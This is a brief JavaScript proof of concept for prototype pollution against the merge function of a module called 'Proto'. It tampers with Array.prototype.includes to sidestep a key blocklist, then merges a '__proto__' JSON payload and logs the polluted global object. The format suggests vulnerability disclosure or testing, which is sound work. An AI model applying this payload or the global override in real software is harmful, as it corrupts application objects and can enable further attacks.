Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const proto = require('Proto');
let payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
proto.merge({}, JSON.parse(payload));
console.log({}.polluted);